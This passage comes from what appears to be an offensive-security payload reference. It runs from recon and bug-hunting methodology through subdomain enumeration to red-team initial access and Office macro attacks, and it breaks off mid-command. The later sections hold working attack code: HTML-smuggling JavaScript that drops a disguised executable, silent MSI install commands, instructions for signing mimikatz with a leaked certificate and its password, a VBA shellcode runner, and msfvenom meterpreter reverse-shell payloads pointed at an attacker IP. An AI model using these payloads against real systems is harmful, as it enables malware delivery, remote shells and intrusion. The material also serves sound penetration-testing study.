--all-namespaces -o json</code></p>"},{"location":"containers/kubernetes/#references","title":"References","text":"<ul> <li>Attacking Kubernetes through Kubelet - Withsecure Labs- 11 January, 2019</li> <li>kubehound - Attack Reference</li> <li>KubeHound: Identifying attack paths in Kubernetes clusters - Datadog - October 2, 2023</li> </ul>"},{"location":"methodology/bug-hunting-methodology/","title":"Bug Hunting Methodology","text":""},{"location":"methodology/bug-hunting-methodology/#summary","title":"Summary","text":"<ul> <li>Passive Recon</li> <li>Shodan</li> <li>Wayback Machine</li> <li>The Harvester</li> <li> <p>Github OSINT</p> </li> <li> <p>Active Recon</p> </li> <li>Network discovery</li> <li> <p>Web discovery</p> </li> <li> <p>Web Vulnerabilities</p> </li> </ul>"},{"location":"methodology/bug-hunting-methodology/#passive-recon","title":"Passive recon","text":"<ul> <li>Using Shodan to detect similar app</li> </ul> <pre><code>can be integrated with nmap (https://github.com/glennzw/shodan-hq-nse)\nnmap --script shodan-hq.nse --script-args 'apikey=&lt;yourShodanAPIKey&gt;,target=&lt;hackme&gt;'\n</code></pre> <ul> <li>Using The Wayback Machine to detect forgotten endpoints</li> </ul> <pre><code>look for JS files, old links\ncurl -sX GET \"http://web.archive.org/cdx/search/cdx?url=&lt;targetDomain.com&gt;&amp;output=text&amp;fl=original&amp;collapse=urlkey&amp;matchType=prefix\"\n</code></pre> <ul> <li>Using The Harvester</li> </ul> <pre><code>python theHarvester.py -b all -d domain.com\n</code></pre> <ul> <li> <p>Look for private information in GitHub repos with GitRob <pre><code>gitrob analyze johndoe --site=https://github.acme.com --endpoint=https://github.acme.com/api/v3 --access-tokens=token1,token2\n</code></pre></p> </li> <li> <p>Perform Google Dorks search</p> </li> </ul>"},{"location":"methodology/bug-hunting-methodology/#active-recon","title":"Active recon","text":""},{"location":"methodology/bug-hunting-methodology/#network-discovery","title":"Network discovery","text":"<ul> <li>Subdomains enumeration</li> <li>Enumerate already found subdomains: projectdiscovery/subfinder: <code>subfinder -d hackerone.com</code></li> <li>Permutate subdomains: infosec-au/altdns</li> <li>Bruteforce subdomains: Josue87/gotator</li> <li> <p>Subdomain takeovers: EdOverflow/can-i-take-over-xyz</p> </li> <li> <p>Network discovery</p> </li> <li>Scan IP ranges with <code>nmap</code>, robertdavidgraham/masscan and projectdiscovery/naabu</li> <li> <p>Discover services, version and banners</p> </li> <li> <p>Review latest acquisitions</p> </li> <li> <p>ASN enumeration</p> </li> <li> <p>projectdiscovery/asnmap: <code>asnmap -a AS45596 -silent</code></p> </li> <li> <p>DNS Zone Transfer   <pre><code>host -t ns domain.local\ndomain.local name server master.domain.local.\n\nhost master.domain.local        \nmaster.domain.local has address 192.168.1.1\n\ndig axfr domain.local @192.168.1.1\n</code></pre></p> </li> </ul>"},{"location":"methodology/bug-hunting-methodology/#web-discovery","title":"Web discovery","text":"<ul> <li>Locate <code>robots.txt</code>, <code>security.txt</code>, <code>sitemap.xml</code> files</li> <li>Retrieve comments in source code</li> <li>Discover URL: tomnomnom/waybackurls</li> <li> <p>Search for <code>hidden</code> parameters: PortSwigger/param-miner</p> </li> <li> <p>List all the subdirectories and files with <code>gobuster</code> or <code>ffuf</code> <pre><code># gobuster -w wordlist -u URL -t threads\n./gobuster -u http://example.com/ -w words.txt -t 10\n</code></pre></p> </li> <li> <p>Find backup files with mazen160/bfac <pre><code>bfac --url http://example.com/test.php --level 4\nbfac --list testing_list.txt\n</code></pre></p> </li> <li> <p>Map technologies: Web service enumeration using projectdiscovery/httpx or Wappalyzer</p> </li> <li> <p>Gather favicon hash, JARM fingerprint, ASN, status code, services and technologies (Github Pages, Cloudflare, Ruby, Nginx,...)</p> </li> <li> <p>Take screenshots for every websites using sensepost/gowitness</p> </li> <li> <p>Automated vulnerability scanners</p> </li> <li>projectdiscovery/nuclei: <code>nuclei -u https://example.com</code></li> <li>Burp Suite's web vulnerability scanner</li> <li> <p>sullo/nikto: <code>./nikto.pl -h http://www.example.com</code></p> </li> <li> <p>Manual Testing: Explore the website with a proxy:</p> </li> <li>Caido - A lightweight web security auditing toolkit</li> <li>ZAP - OWASP Zed Attack Proxy</li> <li>Burp Suite - Community Edition</li> </ul>"},{"location":"methodology/bug-hunting-methodology/#looking-for-web-vulnerabilities","title":"Looking for Web vulnerabilities","text":"<ul> <li>Explore the website and look for vulnerabilities listed in this repository: SQL injection, XSS, CRLF, Cookies, ....</li> <li>Test for Business Logic weaknesses</li> <li>High or negative numerical values</li> <li>Try all the features and click all the buttons</li> <li> <p>The Web Application Hacker's Handbook Checklist copied from http://mdsec.net/wahh/tasks.html</p> </li> <li> <p>Subscribe to the site and pay for the additional functionality to test</p> </li> <li> <p>Inspect Payment functionality - @gwendallecoguic</p> <p>if the webapp you're testing uses an external payment gateway, check the doc to find the test credit numbers, purchase something and if the webapp didn't disable the test mode, it will be free</p> </li> </ul> <p>From https://stripe.com/docs/testing#cards : \"Use any of the following test card numbers, a valid expiration date in the future, and any random CVC number, to create a successful payment. Each test card's billing country is set to U.S. \"   e.g :</p> <p>Test card numbers and tokens  </p> NUMBER BRAND TOKEN 4242424242424242 Visa tok_visa 4000056655665556 Visa (debit) tok_visa_debit 5555555555554444 Mastercard tok_mastercard <p>International test card numbers and tokens     </p> NUMBER TOKEN COUNTRY BRAND 4000000400000008 tok_at Austria (AT) Visa 4000000560000004 tok_be Belgium (BE) Visa 4000002080000001 tok_dk Denmark (DK) Visa 4000002460000001 tok_fi Finland (FI) Visa 4000002500000003 tok_fr France (FR) Visa"},{"location":"methodology/bug-hunting-methodology/#references","title":"References","text":"<ul> <li>[BugBounty] Yahoo phpinfo.php disclosure - Patrik Fehrenbach</li> <li>Nmap CheatSheet - HackerTarget</li> </ul>"},{"location":"methodology/vulnerability-reports/","title":"Vulnerability Reports","text":""},{"location":"methodology/vulnerability-reports/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Vulnerability Report Structure</li> <li>Vulnerability Details Structure</li> <li>General Guidelines</li> <li>References</li> </ul>"},{"location":"methodology/vulnerability-reports/#tools","title":"Tools","text":"<p>Tools to help you collaborate and generate your reports.</p> <ul> <li>GhostManager/Ghostwriter - The SpecterOps project management and reporting engine</li> <li>pwndoc/pwndoc - Pentest Report Generator</li> </ul> <p>List of penetration test reports and templates.</p> <ul> <li>reconmap/pentest-reports - Collection of penetration test reports and pentest report templates</li> <li>juliocesarfort/public-pentesting-reports - A list of public penetration test reports published by several consulting firms and academic security groups.</li> </ul>"},{"location":"methodology/vulnerability-reports/#vulnerability-report-structure","title":"Vulnerability Report Structure","text":"<ul> <li>Executive Summary</li> <li>Security Findings and Recommendations</li> <li>Vulnerabilities (sorted by severity)</li> <li>Appendix (optional)</li> </ul>"},{"location":"methodology/vulnerability-reports/#vulnerability-details-structure","title":"Vulnerability Details Structure","text":"<ul> <li>Summary: a concise introduction to the vulnerability, providing a snapshot of the issue and its potential reach..</li> <li>Impact: detailed insights into the potential business ramifications that could arise from exploiting this vulnerability.</li> <li>Reproductions Steps: a comprehensive, step-by-step walkthrough on how to replicate the issue,, complete with screenshots, HTTP requests or Proof of Concept code snippets.</li> <li>Recommendations: suggestions and best practices for addressing and resolving the highlighted issue.</li> <li>References: links to external content, documentation, and security guidelines, including resources like OWASP.</li> <li>Severity: Include a severity score like CVSS.</li> </ul>"},{"location":"methodology/vulnerability-reports/#general-guidelines","title":"General Guidelines","text":"<ul> <li>Use a Passive Voice Form.</li> <li>Obfuscate the secrets: passwords, token, ...</li> <li>Add caption to all figures and pictures.</li> </ul>"},{"location":"methodology/vulnerability-reports/#references","title":"References","text":"<ul> <li>Best Practices for Writing Quality Vulnerability Reports - Krzysztof Pranczk</li> <li>Overview of technical writing courses - Google Technical Writing</li> </ul>"},{"location":"redteam/access/attack-surface-enumeration/","title":"Subdomains Enumeration","text":""},{"location":"redteam/access/attack-surface-enumeration/#summary","title":"Summary","text":"<ul> <li>Enumerate all subdomains</li> <li>Subbrute</li> <li>KnockPy</li> <li>GoogleDorks</li> <li>EyeWitness</li> <li>Sublist3r</li> <li>Subfinder</li> <li>Findomain</li> <li>Aquatone (Ruby and Go versions)</li> <li>AltDNS</li> <li>MassDNS</li> <li>Nmap</li> <li>Dnsdumpster</li> <li>Subdomain take over</li> <li>tko-subs</li> <li>HostileSubBruteForcer</li> <li>SubOver</li> </ul>"},{"location":"redteam/access/attack-surface-enumeration/#enumerate-all-subdomains-only-if-the-scope-is-domainext","title":"Enumerate all subdomains (only if the scope is *.domain.ext)","text":""},{"location":"redteam/access/attack-surface-enumeration/#using-subbrute","title":"Using Subbrute","text":"<pre><code>git clone https://github.com/TheRook/subbrute\npython subbrute.py domain.example.com\n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#using-knockpy-with-daniel-miesslers-seclists-for-subdomain-discoverdns","title":"Using KnockPy with Daniel Miessler\u2019s SecLists for subdomain \"/Discover/DNS\"","text":"<pre><code>git clone https://github.com/guelfoweb/knock\ngit clone https://github.com/danielmiessler/SecLists.git\nknockpy domain.com -w subdomains-top1mil-110000.txt\n</code></pre> <p>Using EyeWitness and Nmap scans from the KnockPy and enumall scans</p> <pre><code>git clone https://github.com/ChrisTruncer/EyeWitness.git\n./setup/setup.sh\n./EyeWitness.py -f filename -t optionaltimeout --open (Optional)\n./EyeWitness -f urls.txt --web\n./EyeWitness -x urls.xml -t 8 --headless\n./EyeWitness -f rdp.txt --rdp\n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#using-google-dorks-and-google-transparency-report","title":"Using Google Dorks and Google Transparency Report","text":"<p>You need to include subdomains ;) https://www.google.com/transparencyreport/https/ct/?hl=en-US#domain=[DOMAIN]g&amp;incl_exp=true&amp;incl_sub=true</p> <pre><code>site:*.domain.com -www\nsite:domain.com filetype:pdf\nsite:domain.com inurl:'&amp;'\nsite:domain.com inurl:login,register,upload,logout,redirect,redir,goto,admin\nsite:domain.com ext:php,asp,aspx,jsp,jspa,txt,swf\nsite:*.*.domain.com\n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#using-sublist3r","title":"Using Sublist3r","text":"<pre><code>To enumerate subdomains of specific domain and show the results in realtime:\npython sublist3r.py -v -d example.com\n\nTo enumerate subdomains and enable the bruteforce module:\npython sublist3r.py -b -d example.com\n\nTo enumerate subdomains and use specific engines such Google, Yahoo and Virustotal engines\npython sublist3r.py -e google,yahoo,virustotal -d example.com\n\npython sublist3r.py -b -d example.com\n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#using-subfinder","title":"Using Subfinder","text":"<pre><code>go get github.com/subfinder/subfinder\n./Subfinder/subfinder --set-config PassivetotalUsername='USERNAME',PassivetotalKey='KEY'\n./Subfinder/subfinder --set-config RiddlerEmail=\"EMAIL\",RiddlerPassword=\"PASSWORD\"\n./Subfinder/subfinder --set-config CensysUsername=\"USERNAME\",CensysSecret=\"SECRET\"\n./Subfinder/subfinder --set-config SecurityTrailsKey='KEY'\n./Subfinder/subfinder -d example.com -o /tmp/results_subfinder.txt\n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#using-findomain","title":"Using Findomain","text":"<pre><code>$ wget https://github.com/Edu4rdSHL/findomain/releases/latest/download/findomain-linux\n$ chmod +x findomain-linux\n$ findomain_spyse_token=\"YourAccessToken\"\n$ findomain_virustotal_token=\"YourAccessToken\" \n$ findomain_fb_token=\"YourAccessToken\" \n$ ./findomain-linux -t example.com -o\n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#using-aquatone-old-version-ruby","title":"Using Aquatone - old version (Ruby)","text":"<pre><code>gem install aquatone\n\nDiscover subdomains : results in ~/aquatone/example.com/hosts.txt\naquatone-discover --domain example.com\naquatone-discover --domain example.com --threads 25\naquatone-discover --domain example.com --sleep 5 --jitter 30\naquatone-discover --set-key shodan o1hyw8pv59vSVjrZU3Qaz6ZQqgM91ihQ\n\nActive scans : results in ~/aquatone/example.com/urls.txt\naquatone-scan --domain example.com\naquatone-scan --domain example.com --ports 80,443,3000,8080\naquatone-scan --domain example.com --ports large\naquatone-scan --domain example.com --threads 25\n\nFinal results\naquatone-gather --domain example.com\n</code></pre> <p>Alternatively, you can use the Docker image provided by txt3rob.</p> <pre><code>https://hub.docker.com/r/txt3rob/aquatone-docker/\ndocker pull txt3rob/aquatone-docker\ndocker run -it txt3rob/aquatone-docker aq example.com\n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#using-aquatone-new-version-go","title":"Using Aquatone - new version (Go)","text":"<pre><code># Subfinder version\n./Subfinder/subfinder -d $1 -r 8.8.8.8,1.1.1.1 -nW -o /tmp/subresult$1\ncat /tmp/subresult$1 | ./Aquatone/aquatone -ports large -out /tmp/aquatone$1\n\n# Amass version\n./Amass/amass -active -brute -o /tmp/hosts.txt -d $1\ncat /tmp/hosts.txt | ./Aquatone/aquatone -ports large -out /tmp/aquatone$1\n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#using-altdns","title":"Using AltDNS","text":"<p>It's recommended to use massdns in order to resolve the result of <code>AltDNS</code></p> <pre><code>WORDLIST_PERMUTATION=\"./Altdns/words.txt\"\npython2.7 ./Altdns/altdns.py -i /tmp/inputdomains.txt -o /tmp/out.txt -w $WORDLIST_PERMUTATION\n</code></pre> <p>Alternatively you can use goaltdns</p>"},{"location":"redteam/access/attack-surface-enumeration/#using-massdns","title":"Using MassDNS","text":"<pre><code>DNS_RESOLVERS=\"./resolvers.txt\"\ncat /tmp/results_subfinder.txt | massdns -r $DNS_RESOLVERS -t A -o S -w /tmp/results_subfinder_resolved.txt\n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#using-nmap","title":"Using Nmap","text":"<pre><code>nmap -sn --script hostmap-crtsh host_to_scan.tld\n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#using-dnsdumpster","title":"Using dnsdumpster","text":"<pre><code>git clone https://github.com/nmmapper/dnsdumpster\npython dnsdumpster.py -d domainname.com\n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#subdomain-take-over","title":"Subdomain take over","text":"<p>Check Can I take over xyz by EdOverflow for a list of services and how to claim (sub)domains with dangling DNS records.</p>"},{"location":"redteam/access/attack-surface-enumeration/#using-tko-subs","title":"Using tko-subs","text":"<pre><code>go get github.com/anshumanbh/tko-subs\n./bin/tko-subs -domains=./lists/domains_tkos.txt -data=./lists/providers-data.csv  \n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#using-hostilesubbruteforcer","title":"Using HostileSubBruteForcer","text":"<pre><code>git clone https://github.com/nahamsec/HostileSubBruteforcer\nchmod +x sub_brute.rb\n./sub_brute.rb\n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#using-subover","title":"Using SubOver","text":"<pre><code>go get github.com/Ice3man543/SubOver\n./SubOver -l subdomains.txt\n</code></pre>"},{"location":"redteam/access/attack-surface-enumeration/#references","title":"References","text":"<ul> <li>Subdomain Takeover: Proof Creation for Bug Bounties - Patrik Hudak</li> <li>Subdomain Takeover: Basics - Patrik Hudak</li> </ul>"},{"location":"redteam/access/html-smuggling/","title":"HTML Smuggling","text":""},{"location":"redteam/access/html-smuggling/#summary","title":"Summary","text":"<ul> <li>Description</li> <li>Executable Storage</li> </ul>"},{"location":"redteam/access/html-smuggling/#description","title":"Description","text":"<p>HTML Smuggling consists of making a user to navigate to our crafted HTML page which automaticaly download our malicious file.</p>"},{"location":"redteam/access/html-smuggling/#executable-storage","title":"Executable storage","text":"<p>We can store our payload in a Blob object =&gt; JS: <code>var blob = new Blob([data], {type: 'octet/stream'});</code> To perform the download, we need to create an Object Url =&gt; JS: <code>var url = window.URL.createObjectURL(blob);</code> With those two elements, we can create with Javascript our \\ tag which will be used to download our malicious file:  <pre><code>var a = document.createElement('a');\ndocument.body.appendChild(a);\na.style = 'display: none';\nvar url = window.URL.createObjectURL(blob);\na.href = url;\na.download = fileName;\na.click();\nwindow.URL.revokeObjectURL(url);\n</code></pre> <p>To store ou payload, we use base64 encoding:  <pre><code>function base64ToArrayBuffer(base64) {\n    var binary_string = window.atob(base64);\n    var len = binary_string.length;\n    var bytes = new Uint8Array( len );\n    for (var i = 0; i &lt; len; i++) { bytes[i] = binary_string.charCodeAt(i); }\n    return bytes.buffer;\n}\n\nvar file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...\nvar data = base64ToArrayBuffer(file);\nvar blob = new Blob([data], {type: 'octet/stream'});\nvar fileName = 'NotAMalware.exe';\n</code></pre></p>"},{"location":"redteam/access/initial-access/","title":"Initial Access","text":"<p>Initial Access Files in the context of a Red Team exercise refer to the set of files, scripts, executables, or documents used by the Red Team to initially infiltrate the target system or network. These files often contain malicious payloads or are designed to exploit specific vulnerabilities in order to establish a foothold in the target environment.</p>"},{"location":"redteam/access/initial-access/#summary","title":"Summary","text":"<ul> <li>Complex Chains</li> <li>Container</li> <li>Payload<ul> <li>Binary Files</li> <li>Code Execution Files</li> <li>Embedded Files</li> </ul> </li> <li>Code Signing</li> </ul>"},{"location":"redteam/access/initial-access/#complex-chains","title":"Complex Chains","text":"<p>DELIVERY(CONTAINER(TRIGGER + PAYLOAD + DECOY))</p> <ul> <li>DELIVERY: means to deliver a pack full of files<ul> <li>HTML Smuggling, SVG Smuggling, Attachments</li> </ul> </li> <li>CONTAINER: archive bundling all infection dependencies<ul> <li>ISO/IMG, ZIP, WIM</li> </ul> </li> <li>TRIGGER: some way to run the payload<ul> <li>LNK, CHM, ClickOnce applications</li> </ul> </li> <li>PAYLOAD: the malware<ul> <li>Binary Files</li> <li>Code Execution Files</li> <li>Embedded Files</li> </ul> </li> <li>DECOY: used to continue pretext narration after detonating malware<ul> <li>Typically open PDF files</li> </ul> </li> </ul> <p>Examples: * HTML SMUGGLING(PASSWORD PROTECTED ZIP + ISO(LNK + IcedID  + PNG)) used by TA551/Storm-0303</p>"},{"location":"redteam/access/initial-access/#container","title":"Container","text":"<ul> <li>ISO/IMG - can contain hidden files, gets automounted giving easy access to contained files (<code>powershell \u2013c .\\malware.exe</code>)</li> <li>ZIP - can contain hidden files (locate ZIP + unpack it + change dir + run Malware)</li> <li>WIM - Windows Image, builtin format used to deploy system features     <pre><code># Mount/Unmount .WIM\nPS&gt; Mount-WindowsImage -ImagePath myarchive.wim -Path \"C:\\output\\path\\to\\extract\" -Index 1\nPS&gt; Dismount-WindowsImage -Path \"C:\\output\\path\\to\\extract\" -Discard\n</code></pre></li> <li>7-zip, RAR, GZ - should get a native support on Windows 11</li> </ul>"},{"location":"redteam/access/initial-access/#trigger","title":"Trigger","text":"<ul> <li>LNK</li> <li>CHM</li> <li>ClickOnce</li> </ul>"},{"location":"redteam/access/initial-access/#payload","title":"Payload","text":""},{"location":"redteam/access/initial-access/#binary-files","title":"Binary Files","text":"<p>These files can be executed directly on the system without any third party.</p> <ul> <li>.exe file, executable file can be run with a click</li> <li>.dll file, execute with <code>rundll32 main.dll,DllMain</code> <pre><code>#define WIN32_LEAN_AND_MEAN\n#include &lt;windows.h&gt;\n\nextern \"C\" __declspec(dllexport)\nDWORD WINAPI MessageBoxThread(LPVOID lpParam) {\nMessageBox(NULL, \"Hello world!\", \"Hello World!\", NULL);\nreturn 0;\n}\n\nextern \"C\" __declspec(dllexport)\nBOOL APIENTRY DllMain(HMODULE hModule,\n                    DWORD ul_reason_for_call,\n                    LPVOID lpReserved) {\nswitch (ul_reason_for_call) {\n    case DLL_PROCESS_ATTACH:\n    CreateThread(NULL, NULL, MessageBoxThread, NULL, NULL, NULL);\n    break;\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n    break;\n}\nreturn TRUE;\n}\n</code></pre></li> <li>.cpl file, same as a .dll file with Cplapplet export     <pre><code>#include \"stdafx.h\"\n#include &lt;Windows.h&gt;\n\nextern \"C\" __declspec(dllexport) LONG Cplapplet(\n    HWND hwndCpl,\n    UINT msg,\n    LPARAM lParam1,\n    LPARAM lParam2\n)\n{\n    MessageBoxA(NULL, \"Hey there, I am now your control panel item you know.\", \"Control Panel\", 0);\n    return 1;\n}\n\nBOOL APIENTRY DllMain( HMODULE hModule,\n                    DWORD  ul_reason_for_call,\n                    LPVOID lpReserved\n                    )\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n    {\n        Cplapplet(NULL, NULL, NULL, NULL);\n    }\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n</code></pre></li> </ul>"},{"location":"redteam/access/initial-access/#code-execution-files","title":"Code Execution Files","text":"<ul> <li>Word with Macro (.doc, .docm)</li> <li>Excel library (.xll)</li> <li>Excel macro-enabled add-in file (.xlam)     <pre><code>xcopy /Q/R/S/Y/H/G/I evil.ini %APPDATA%\\Microsoft\\Excel\\XLSTART\n</code></pre></li> <li>WSF files (.wsf)</li> <li>MSI installers (.msi)     <pre><code>powershell Unblock-File evil.msi; msiexec /q /i .\\evil.msi \n</code></pre></li> <li>MSIX/APPX app package (.msix, .appx)</li> <li>ClickOnce (.application, .vsto, .appref-ms)</li> <li>Powershell scripts (.ps1)</li> <li>Windows Script Host scripts (.wsh, .vbs)     <pre><code>cscript.exe payload.vbs\nwscript payload.vbs\nwscript /e:VBScript payload.txt\n</code></pre></li> </ul>"},{"location":"redteam/access/initial-access/#embedded-files","title":"Embedded Files","text":"<ul> <li>ICS Calendar Invites with Embedded Files</li> </ul>"},{"location":"redteam/access/initial-access/#code-signing","title":"Code Signing","text":"<p>Certificate can be Expired, Revoked, Valid.</p> <p>Many certificates leaked on the Internet and got re-used by Threat Actor. Some of them can be found on VirusTotal, with the query :  <code>content:{02 01 03 30}@4 AND NOT tag:peexe</code></p> <p>In 2022, LAPSUS$ claimed responsibility for a cyberattack on NVIDIA, a major graphics card and AI technology manufacturer. As part of this attack, LAPSUS$ allegedly stole proprietary data from NVIDIA and threatened to leak it. The leak contained</p> <ul> <li>Certificates can be password protected. Use pfx2john.py <pre><code>john --wordlist=/opt/wordlists/rockyou.txt --format=pfx pfx.hashes\n</code></pre></li> <li>Sign a binary with a certificate.     <pre><code>osslsigncode sign -pkcs12 certs/nvidia-2014.pfx -in mimikatz.exe -out generated/signed-mimikatz.exe -pass nv1d1aRules\n</code></pre></li> <li>The following files can be signed with a certificate<ul> <li>executables: .exe, .dll, .ocx, .xll, .wll</li> <li>scripts: .vbs, .js, .ps1</li> <li>installers: .msi, .msix, .appx, .msixbundle, .appxbundle</li> <li>drivers: .sys</li> <li>cabinets: .cab</li> <li>ClickOnce: .application, .manifest, .vsto</li> </ul> </li> </ul>"},{"location":"redteam/access/initial-access/#references","title":"References","text":"<ul> <li>Top 10 Payloads: Highlighting Notable and Trending Techniques - delivr.to</li> <li>Executing Code as a Control Panel Item through an Exported Cplapplet Function - @spotheplanet</li> <li>Desperate Infection Chains - Multi-Step Initial Access Strategies by Mariusz Banach - x33fcon Youtube</li> <li>Desperate Infection Chains - Multi-Step Initial Access Strategies by Mariusz Banach - x33fcon PDF</li> <li>Red Macros Factory - https://binary-offensive.com/</li> </ul>"},{"location":"redteam/access/office-attacks/","title":"Office - Attacks","text":""},{"location":"redteam/access/office-attacks/#summary","title":"Summary","text":"<ul> <li>Office Products Features</li> <li>Office Default Passwords</li> <li>Office Macro execute WinAPI</li> <li>Excel<ul> <li>XLSM - Hot Manchego</li> <li>XLS - Macrome</li> <li>XLM Excel 4.0 - SharpShooter</li> <li>XLM Excel 4.0 - EXCELntDonut</li> <li>XLM Excel 4.0 - EXEC</li> <li>SLK - EXEC</li> </ul> </li> <li>Word<ul> <li>DOCM - Metasploit</li> <li>DOCM - Download and Execute</li> <li>DOCM - Macro Creator</li> <li>DOCM - C# converted to Office VBA macro</li> <li>DOCM - VBA Wscript</li> <li>DOCM - VBA Shell Execute Comment</li> <li>DOCM - VBA Spawning via svchost.exe using Scheduled Task</li> <li>DCOM - WMI COM functions (VBA AMSI)</li> <li>DOCM - winmgmts</li> <li>DOCM - Macro Pack - Macro and DDE</li> <li>DOCM - BadAssMacros</li> <li>DOCM - CACTUSTORCH VBA Module</li> <li>DOCM - MMG with Custom DL + Exec</li> <li>VBA Obfuscation</li> <li>VBA Purging<ul> <li>OfficePurge</li> <li>EvilClippy</li> </ul> </li> <li>VBA AMSI</li> <li>VBA - Offensive Security Template</li> <li>DOCX - Template Injection</li> <li>DOCX - DDE</li> </ul> </li> <li>References</li> </ul>"},{"location":"redteam/access/office-attacks/#office-products-features","title":"Office Products Features","text":""},{"location":"redteam/access/office-attacks/#office-default-passwords","title":"Office Default Passwords","text":"<p>By default, Excel does not set a password when saving a new file. However, some older versions of Excel had a default password that was used if the user did not set a password themselves. The default password was \"<code>VelvetSweatshop</code>\", and it could be used to open any file that did not have a password set.</p> <p>If the user has not supplied an encryption password and the document is encrypted, the default encryption choice using the techniques specified in section 2.3 MUST be the following password: \"<code>\\x2f\\x30\\x31\\x48\\x61\\x6e\\x6e\\x65\\x73\\x20\\x52\\x75\\x65\\x73\\x63\\x68\\x65\\x72\\x2f\\x30\\x31</code>\". - 2.4.2.3 Binary Document Write Protection Method 3</p> Product Password Supported Formats Excel VelvetSweatshop all Excel formats PowerPoint 01Hannes Ruescher/01 .pps .ppt"},{"location":"redteam/access/office-attacks/#office-macro-execute-winapi","title":"Office Macro execute WinAPI","text":""},{"location":"redteam/access/office-attacks/#description","title":"Description","text":"<p>To importe Win32 function we need to use the keyword <code>Private Declare</code> <code>Private Declare Function &lt;NAME&gt; Lib \"&lt;DLL_NAME&gt;\" Alias \"&lt;FUNCTION_IMPORTED&gt;\" (&lt;ByVal/ByRef&gt; &lt;NAME_VAR&gt; As &lt;TYPE&gt;, etc.) As &lt;TYPE&gt;</code> If we work on 64bit, we need to add the keyword <code>PtrSafe</code> between the keywords <code>Declare</code> and <code>Function</code> Importing the <code>GetUserNameA</code> from <code>advapi32.dll</code>:  <pre><code>Private Declare PtrSafe Function GetUserName Lib \"advapi32.dll\" Alias \"GetUserNameA\" (ByVal lpBuffer As String, ByRef nSize As Long) As Long\n</code></pre> <code>GetUserNameA</code> prototype in C:  <pre><code>BOOL GetUserNameA(\n  LPSTR   lpBuffer,\n  LPDWORD pcbBuffer\n);\n</code></pre></p>"},{"location":"redteam/access/office-attacks/#example-with-a-simple-shellcode-runner","title":"Example with a simple Shellcode Runner","text":"<pre><code>Private Declare PtrSafe Function VirtualAlloc Lib \"Kernel32.dll\" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib \"Kernel32.dll\" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr\nPrivate Declare PtrSafe Function CreateThread Lib \"KERNEL32.dll\" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr\n\nSub WinAPI()\n    Dim buf As Variant\n    Dim addr As LongPtr\n    Dim counter As Long\n    Dim data As Long\n\n    buf = Array(252, ...)\n\n    addr = VirtualAlloc(0, UBound(buf), &amp;H3000, &amp;H40)\n\n\n    For counter = LBound(buf) To UBound(buf)\n        data = buf(counter)\n        res = RtlMoveMemory(addr + counter, data, 1)\n    Next counter\n    res = CreateThread(0, 0, addr, 0, 0, 0)\n\n\nEnd Sub\n</code></pre>"},{"location":"redteam/access/office-attacks/#excel","title":"Excel","text":""},{"location":"redteam/access/office-attacks/#xlsm-hot-manchego","title":"XLSM - Hot Manchego","text":"<p>When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn't catch a simple lolbas payload to get a beacon on a target machine.</p> <ul> <li>https://github.com/FortyNorthSecurity/hot-manchego</li> </ul> <pre><code>Generate CS Macro and save it to Windows as vba.txt\nPS&gt; New-Item blank.xlsm\nPS&gt; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /reference:EPPlus.dll hot-manchego.cs\nPS&gt; .\\hot-manchego.exe .\\blank.xlsm .\\vba.txt\n</code></pre>"},{"location":"redteam/access/office-attacks/#xlm-macrome","title":"XLM - Macrome","text":"<p>XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros.</p> <ul> <li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip</li> <li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip</li> <li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip</li> </ul> <pre><code># NOTE: The payload cannot contains NULL bytes.\n\n# Default calc\nmsfvenom -a x86 -b '\\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread &gt; popcalc.bin\nmsfvenom -a x64 -b '\\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread &gt; popcalc64.bin\n# Custom shellcode\nmsfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\\x00'\nmsfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\\x00'\n# MSF shellcode\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\\x00'  -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin\nmsfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\\x00' -a x86 --encoder x86/shikata_ga_nai 